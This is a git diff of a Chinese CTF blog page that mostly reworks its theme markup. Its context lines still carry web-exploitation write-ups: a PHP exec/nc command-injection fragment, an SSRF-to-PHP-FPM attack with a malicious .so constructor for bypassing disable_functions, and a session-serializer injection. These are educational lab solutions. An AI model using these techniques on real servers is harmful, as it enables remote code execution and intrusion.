@@ -3053,7 +2905,10 @@ echo exec(&quot;nc&quot;.$_POST[&#39;One-ear&#39;]);
 ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>hash_hmac函数如果传入的参数为数字会返回false，那么就可以控制$clandestine为false，进而控制哈希值让命令执行</p>
-<h2 id="蓝帽杯-2021-One-Pointer-PHP"><a href="#蓝帽杯-2021-One-Pointer-PHP" class="headerlink" title="[蓝帽杯 2021]One Pointer PHP"></a>[蓝帽杯 2021]One Pointer PHP</h2><p>给了源码</p>
+
+        <h2 id="蓝帽杯-2021-One-Pointer-PHP"   >
+          <a href="#蓝帽杯-2021-One-Pointer-PHP" class="heading-link"><i class="fas fa-link"></i></a><a href="#蓝帽杯-2021-One-Pointer-PHP" class="headerlink" title="[蓝帽杯 2021]One Pointer PHP"></a>[蓝帽杯 2021]One Pointer PHP</h2>
+      <p>给了源码</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 <span class="token keyword">include</span> <span class="token string double-quoted-string">"user.php"</span><span class="token punctuation">;</span>
 <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
@@ -3097,7 +2952,10 @@ echo exec(&quot;nc&quot;.$_POST[&#39;One-ear&#39;]);
 
 <p>在9001端口，下一步就是SSRF了</p>
 <blockquote>
-<h3 id="SSRF攻击FPM"><a href="#SSRF攻击FPM" class="headerlink" title="SSRF攻击FPM"></a>SSRF攻击FPM</h3><p>我们可以通过SSRF来攻击FPM，但是受限于这道题的disable_functions，我们无法直接SSRF，但是可以利用<code>file_put_contents()</code>的一个特性来实现SSRF：</p>
+
+        <h3 id="SSRF攻击FPM"   >
+          <a href="#SSRF攻击FPM" class="heading-link"><i class="fas fa-link"></i></a><a href="#SSRF攻击FPM" class="headerlink" title="SSRF攻击FPM"></a>SSRF攻击FPM</h3>
+      <p>我们可以通过SSRF来攻击FPM，但是受限于这道题的disable_functions，我们无法直接SSRF，但是可以利用<code>file_put_contents()</code>的一个特性来实现SSRF：</p>
 <p><code>file_put_contents</code>在使用 ftp 协议时, 会将 data 的内容上传到 ftp 服务器, 由于上面说的<code>pasv</code>模式下, 服务器的地址和端口是可控, 我们可以将地址和端口指到<code>127.0.0.1:9000</code>.同时由于 ftp 的特性,不会有任何的多余内容, 类似<code>gopher</code>协议, 会将<code>data</code>原封不动的发给<code>127.0.0.1:9000</code>, 完美符合攻击fastcgi(FPM)的要求.</p>
 </blockquote>
 <p>首先编写一个恶意so文件</p>
@@ -3479,7 +3337,10 @@ __attribute__ ((__constructor__)) void preload (void)&#123;
 /usr/local/bin/php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>用php命令行模式，同样先绕过open_basedir，再readfile读取flag即可</p>
-<h2 id="bestphp’s-revenge"><a href="#bestphp’s-revenge" class="headerlink" title="bestphp’s revenge"></a>bestphp’s revenge</h2><p>上来就是一个源码</p>
+
+        <h2 id="bestphp’s-revenge"   >
+          <a href="#bestphp’s-revenge" class="heading-link"><i class="fas fa-link"></i></a><a href="#bestphp’s-revenge" class="headerlink" title="bestphp’s revenge"></a>bestphp’s revenge</h2>
+      <p>上来就是一个源码</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'implode'</span><span class="token punctuation">;</span>
@@ -3520,582 +3381,433 @@ serialize_handler&#x3D;php_serialize<span aria-hidden="true" class="line-numbers
 b&#x3D;call_user_func<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p>var_dump查看SESSIONID，最终改Cookie拿flag</p>
-<script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">
-                
-            </div>
-            <hr/>
+<script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css"></div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">本文作者: </span><span class="copyright-author__value"><a href="http://jlan.darkflow.top">J1an</a></span></div><div class="copyright-link"><span class="copyright-link__name">本文链接: </span><span class="copyright-link__value"><a href="http://jlan.darkflow.top/posts/210d3ac7.html">http://jlan.darkflow.top/posts/210d3ac7.html</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">版权声明: </span><span class="copyright-notice__value">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> 许可协议。转载请注明出处！</span></div></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/posts/56040919.html"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">CTFshowNodejs</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/posts/c8094d2d.html"><span class="paginator-prev__text">CTFshow黑盒测试</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div><div class="comments" id="comments"><div id="valine-container"></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ISITDTU-2019-EasyPHP"><span class="toc-number">1.</span> <span class="toc-text">
+          [ISITDTU 2019]EasyPHP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GYCTF2020-Ez-Express"><span class="toc-number">2.</span> <span class="toc-text">
+          [GYCTF2020]Ez_Express</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-%E4%B8%8D%E6%98%AF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">3.</span> <span class="toc-text">
+          [安洵杯 2019]不是文件上传</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2020-Roamphp1-Welcome"><span class="toc-number">4.</span> <span class="toc-text">
+          [极客大挑战 2020]Roamphp1-Welcome</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RoarCTF-2019-Online-Proxy"><span class="toc-number">5.</span> <span class="toc-text">
+          [RoarCTF 2019]Online Proxy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HarekazeCTF2019-Avatar-Uploader-1"><span class="toc-number">6.</span> <span class="toc-text">
+          [HarekazeCTF2019]Avatar Uploader 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Web4"><span class="toc-number">7.</span> <span class="toc-text">
+          [CISCN2019 华东南赛区]Web4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BSidesCF-2019-SVGMagic"><span class="toc-number">8.</span> <span class="toc-text">
+          [BSidesCF 2019]SVGMagic</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#N1CTF-2018-eating-cms"><span class="toc-number">9.</span> <span class="toc-text">
+          [N1CTF 2018]eating_cms</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FireshellCTF2020-Caas"><span class="toc-number">10.</span> <span class="toc-text">
+          [FireshellCTF2020]Caas</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#October-2019-Twice-SQL-Injection"><span class="toc-number">11.</span> <span class="toc-text">
+          October 2019 Twice SQL Injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EIS-2019-EzPOP"><span class="toc-number">12.</span> <span class="toc-text">
+          [EIS 2019]EzPOP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WMCTF2020-Make-PHP-Great-Again"><span class="toc-number">13.</span> <span class="toc-text">
+          [WMCTF2020]Make PHP Great Again</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2020-Greatphp"><span class="toc-number">14.</span> <span class="toc-text">
+          [极客大挑战 2020]Greatphp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SUCTF-2018-MultiSQL"><span class="toc-number">15.</span> <span class="toc-text">
+          [SUCTF 2018]MultiSQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SWPU2019-Web4"><span class="toc-number">16.</span> <span class="toc-text">
+          [SWPU2019]Web4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GXYCTF2019-BabysqliV3-0"><span class="toc-number">17.</span> <span class="toc-text">
+          [GXYCTF2019]BabysqliV3.0</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SUCTF-2018-annonymous"><span class="toc-number">18.</span> <span class="toc-text">
+          [SUCTF 2018]annonymous</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RoarCTF-2019-Simple-Upload"><span class="toc-number">19.</span> <span class="toc-text">
+          [RoarCTF 2019]Simple Upload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GoogleCTF2019-Quals-Bnv"><span class="toc-number">20.</span> <span class="toc-text">
+          [GoogleCTF2019 Quals]Bnv</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GWCTF-2019-mypassword"><span class="toc-number">21.</span> <span class="toc-text">
+          [GWCTF 2019]mypassword</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DDCTF-2019-homebrew-event-loop"><span class="toc-number">22.</span> <span class="toc-text">
+          [DDCTF 2019]homebrew event loop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RootersCTF2019-babyWeb"><span class="toc-number">23.</span> <span class="toc-text">
+          [RootersCTF2019]babyWeb</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HFCTF2020-BabyUpload"><span class="toc-number">24.</span> <span class="toc-text">
+          [HFCTF2020]BabyUpload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NPUCTF2020-ezlogin"><span class="toc-number">25.</span> <span class="toc-text">
+          [NPUCTF2020]ezlogin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EasyBypass"><span class="toc-number">26.</span> <span class="toc-text">
+          EasyBypass</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2020-%E6%96%B0%E6%98%A5%E7%BA%A2%E5%8C%85%E9%A2%98-1"><span class="toc-number">27.</span> <span class="toc-text">
+          [2020 新春红包题]1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BE%8A%E5%9F%8E%E6%9D%AF2020-easyphp"><span class="toc-number">28.</span> <span class="toc-text">
+          [羊城杯2020]easyphp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XNUCA2019Qualifier-EasyPHP"><span class="toc-number">29.</span> <span class="toc-text">
+          [XNUCA2019Qualifier]EasyPHP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pasecactf-2019-flask-ssti"><span class="toc-number">30.</span> <span class="toc-text">
+          [pasecactf_2019]flask_ssti</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-iamthinking"><span class="toc-number">31.</span> <span class="toc-text">
+          [安洵杯 2019]iamthinking</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN2019-%E6%80%BB%E5%86%B3%E8%B5%9B-Day1-Web4-Laravel1"><span class="toc-number">32.</span> <span class="toc-text">
+          [CISCN2019 总决赛 Day1 Web4]Laravel1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#virink-2019-files-share"><span class="toc-number">33.</span> <span class="toc-text">
+          virink_2019_files_share</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NESTCTF-2019-Love-Math-2"><span class="toc-number">34.</span> <span class="toc-text">
+          [NESTCTF 2019]Love Math 2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PASECA2019-honey-shop"><span class="toc-number">35.</span> <span class="toc-text">
+          [PASECA2019]honey_shop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GYCTF2020-Node-Game"><span class="toc-number">36.</span> <span class="toc-text">
+          [GYCTF2020]Node Game</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HTTP%E8%AF%B7%E6%B1%82%E8%B7%AF%E5%BE%84%E4%B8%AD%E7%9A%84unicode%E5%AD%97%E7%AC%A6%E6%8D%9F%E5%9D%8F"><span class="toc-number"></span> <span class="toc-text">
+          HTTP请求路径中的unicode字符损坏</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#watevrCTF-2019-Pickle-Store"><span class="toc-number">1.</span> <span class="toc-text">
+          [watevrCTF-2019]Pickle Store</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8C%97%E8%B5%9B%E5%8C%BA-Web2"><span class="toc-number">2.</span> <span class="toc-text">
+          [CISCN2019 华东北赛区]Web2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RootersCTF2019-ImgXweb"><span class="toc-number">3.</span> <span class="toc-text">
+          [RootersCTF2019]ImgXweb</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GWCTF-2019-%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97"><span class="toc-number">4.</span> <span class="toc-text">
+          [GWCTF 2019]你的名字</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BSidesCF-2020-Hurdles"><span class="toc-number">5.</span> <span class="toc-text">
+          [BSidesCF 2020]Hurdles</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HarekazeCTF2019-Easy-Notes"><span class="toc-number">6.</span> <span class="toc-text">
+          [HarekazeCTF2019]Easy Notes</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BSidesCF-2019-Pick-Tac-Toe"><span class="toc-number">7.</span> <span class="toc-text">
+          [BSidesCF 2019]Pick Tac Toe</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RCTF-2019-Nextphp"><span class="toc-number">8.</span> <span class="toc-text">
+          [RCTF 2019]Nextphp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#watevrCTF-2019-Supercalc"><span class="toc-number">9.</span> <span class="toc-text">
+          [watevrCTF-2019]Supercalc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SWPU2019-Web3"><span class="toc-number">10.</span> <span class="toc-text">
+          [SWPU2019]Web3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Unfinish"><span class="toc-number">11.</span> <span class="toc-text">
+          [网鼎杯2018]Unfinish</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSAWQual-2016-i-got-id"><span class="toc-number">12.</span> <span class="toc-text">
+          [CSAWQual 2016]i_got_id</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FBCTF2019-Event"><span class="toc-number">13.</span> <span class="toc-text">
+          [FBCTF2019]Event</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E7%8E%84%E6%AD%A6%E7%BB%84-SSRFMe"><span class="toc-number">14.</span> <span class="toc-text">
+          [网鼎杯 2020 玄武组]SSRFMe</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6"><span class="toc-number">14.1.</span> <span class="toc-text">
+          Redis主从复制</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-notes"><span class="toc-number">15.</span> <span class="toc-text">
+          [网鼎杯 2020 青龙组]notes</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-Easyphp2"><span class="toc-number">16.</span> <span class="toc-text">
+          [羊城杯 2020]Easyphp2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HFCTF-2021-Final-easyflask"><span class="toc-number">17.</span> <span class="toc-text">
+          [HFCTF 2021 Final]easyflask</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HITCON-2016-Leaking"><span class="toc-number">18.</span> <span class="toc-text">
+          [HITCON 2016]Leaking</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NPUCTF2020-%E9%AA%8C%E8%AF%81%F0%9F%90%8E"><span class="toc-number">19.</span> <span class="toc-text">
+          [NPUCTF2020]验证🐎</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN2021-Quals-upload"><span class="toc-number">20.</span> <span class="toc-text">
+          [CISCN2021 Quals]upload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-Blackcat"><span class="toc-number">21.</span> <span class="toc-text">
+          [羊城杯 2020]Blackcat</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%93%9D%E5%B8%BD%E6%9D%AF-2021-One-Pointer-PHP"><span class="toc-number">22.</span> <span class="toc-text">
+          [蓝帽杯 2021]One Pointer PHP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF%E6%94%BB%E5%87%BBFPM"><span class="toc-number">22.1.</span> <span class="toc-text">
+          SSRF攻击FPM</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bestphp%E2%80%99s-revenge"><span class="toc-number">23.</span> <span class="toc-text">
+          bestphp’s revenge</span></a></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/head.png" alt="avatar"></div><p class="sidebar-ov-author__text">生命不息，折腾不止！</p></div><div class="sidebar-ov-social"><a class="sidebar-ov-social-item" href="https://github.com/zhisenyu" target="_blank" rel="noopener" data-popover="Github" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-github"></i></span></a><a class="sidebar-ov-social-item" href="https://www.youtube.com/channel/UCarZXyGTzWssmNANey0TC3g" target="_blank" rel="noopener" data-popover="Youtube" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-youtube"></i></span></a><a class="sidebar-ov-social-item" href="z405454586" target="_blank" rel="noopener" data-popover="微信" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-weixin"></i></span></a><a class="sidebar-ov-social-item" href="tencent://message?uin=405454586" target="_blank" rel="noopener" data-popover="QQ" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-qq"></i></span></a></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">72</div><div class="sidebar-ov-state-item__name">归档</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">11</div><div class="sidebar-ov-state-item__name">标签</div></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2023</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>J1an</span></div><div><span>由 <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> 强力驱动</span><span> v6.0.0</span><span class="footer__devider">|</span><span>主题 - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div><div class="busuanzi"><span class="busuanzi-siteuv"><span class="busuanzi-siteuv__icon"><i class="fas fa-user"></i></span><span class="busuanzi-siteuv__info">访问人数</span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_uv"></span></span><span class="busuanzi-sitepv"><span class="busuanzi-siteuv__icon"><i class="fas fa-eye"></i></span><span class="busuanzi-siteuv__info">浏览总量</span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_pv"></span></span></div><div>已经是Dest0g3的菜狗了</div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="搜索文章（支持多关键词，请用空格分隔）"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1.0.1/dist/canvas-nest.min.js" color="0,0,0" opacity="0.6" count="150" zIndex="-1"></script><script>function initSearch() {
+  var isXML = true;
+  var search_path = 'search.xml';
 
-            
+  if (!search_path) {
+    search_path = 'search.xml';
+  } else if (/json$/i.test(search_path)) {
+    isXML = false;
+  }
 
-    <div class="reprint" id="reprint-statement">
-        
-            <div class="reprint__author">
-                <span class="reprint-meta" style="font-weight: bold;">
-                    <i class="fas fa-user">
-                        文章作者:
-                    </i>
-                </span>
-                <span class="reprint-info">
-                    <a href="/about" rel="external nofollow noreferrer">J1an</a>
-                </span>
-            </div>
-            <div class="reprint__type">
-                <span class="reprint-meta" style="font-weight: bold;">
-                    <i class="fas fa-link">
-                        文章链接:
-                    </i>
-                </span>
-                <span class="reprint-info">
-                    <a href="http://jlan.darkflow.top/posts/210d3ac7.html">http://jlan.darkflow.top/posts/210d3ac7.html</a>
-                </span>
-            </div>
-            <div class="reprint__notice">
-                <span class="reprint-meta" style="font-weight: bold;">
-                    <i class="fas fa-copyright">
-                        版权声明:
-                    </i>
-                </span>
-                <span class="reprint-info">
-                    本博客所有文章除特別声明外，均采用
-                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
-                    许可协议。转载请注明来源
-                    <a href="/about" target="_blank">J1an</a>
-                    !
-                </span>
-            </div>
-        
-    </div>
-
-    <script async defer>
-      document.addEventListener("copy", function (e) {
-        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
-        M.toast({html: toastHTML})
-      });
-
-      function navToReprintStatement() {
-        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
-      }
-    </script>
-
-
-
-            <div class="tag_share" style="display: block;">
-                <div class="post-meta__tag-list" style="display: inline-block;">
-                    
-                        <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
-                        </div>
-                    
-                </div>
-                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
-                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
-<div id="article-share">
-
-    
-    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
-    <script src="/libs/share/js/social-share.min.js"></script>
-    
-
-    
-
-</div>
-
-                </div>
-            </div>
-            
-        </div>
-    </div>
-
-    
-
-    
-
-    
-
-    
-
-    
-
-    
-
-    
-
-    
-
-    
-
-<article id="prenext-posts" class="prev-next articles">
-    <div class="row article-row">
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
-            <div class="card">
-                <a href="/posts/56040919.html">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="CTFshowNodejs">
-                        
-                        <span class="card-title">CTFshowNodejs</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-05-28
-                        </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-user fa-fw"></i>
-                            J1an
-                            
-                        </span>
-                    </div>
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/posts/c8094d2d.html">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="CTFshow黑盒测试">
-                        
-                        <span class="card-title">CTFshow黑盒测试</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-05-23
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-user fa-fw"></i>
-                            J1an
-                            
-                        </span>
-                    </div>
-                </div>
-                
-            </div>
-        </div>
-        
-    </div>
-</article>
-
-</div>
-
-
-
-<!-- 代码块功能依赖 -->
-<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
-
-
-  <!-- 是否加载使用自带的 prismjs. -->
-  <script type="text/javascript" src="/libs/prism/prism.min.js"></script>
-
-
-<!-- 代码语言 -->
-
-<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
-
-
-<!-- 代码块复制 -->
-
-<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
-
-
-<!-- 代码块收缩 -->
-
-<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
-
-
-
-    </div>
-    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
-        <div class="toc-widget card" style="background-color: white;">
-            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
-            <div id="toc-content"></div>
-        </div>
-    </div>
-</div>
-
-<!-- TOC 悬浮按钮. -->
-
-<div id="floating-toc-btn" class="hide-on-med-and-down">
-    <a class="btn-floating btn-large bg-color">
-        <i class="fas fa-list-ul"></i>
-    </a>
-</div>
-
-
-<script src="/libs/tocbot/tocbot.min.js"></script>
-<script>
-    $(function () {
-        tocbot.init({
-            tocSelector: '#toc-content',
-            contentSelector: '#articleContent',
-            headingsOffset: -($(window).height() * 0.4 - 45),
-            collapseDepth: Number('0'),
-            headingSelector: 'h2, h3, h4'
-        });
-
-        // Set scroll toc fixed.
-        let tocHeight = parseInt($(window).height() * 0.4 - 64);
-        let $tocWidget = $('.toc-widget');
-        $(window).scroll(function () {
-            let scroll = $(window).scrollTop();
-            /* add post toc fixed. */
-            if (scroll > tocHeight) {
-                $tocWidget.addClass('toc-fixed');
-            } else {
-                $tocWidget.removeClass('toc-fixed');
-            }
-        });
-
-        
-        /* 修复文章卡片 div 的宽度. */
-        let fixPostCardWidth = function (srcId, targetId) {
-            let srcDiv = $('#' + srcId);
-            if (srcDiv.length === 0) {
-                return;
-            }
-
-            let w = srcDiv.width();
-            if (w >= 450) {
-                w = w + 21;
-            } else if (w >= 350 && w < 450) {
-                w = w + 18;
-            } else if (w >= 300 && w < 350) {
-                w = w + 16;
-            } else {
-                w = w + 14;
-            }
-            $('#' + targetId).width(w);
+  var path = '/' + search_path;
+  $.ajax({
+    url: path,
+    dataType: isXML ? 'xml' : 'json',
+    async: true,
+    success: function (res) {
+      var datas = isXML ? $('entry', res).map(function () {
+        // 将 XML 转为 JSON
+        return {
+          title: $('title', this).text(),
+          content: $('content', this).text(),
+          url: $('url', this).text()
         };
+      }).get() : res;
+      var $input = $('.search-input input');
+      var $result = $('.search-results');
+      // 搜索对象（标题、内容）的权重，影响显示顺序
+      var WEIGHT = { title: 100, content: 1 };
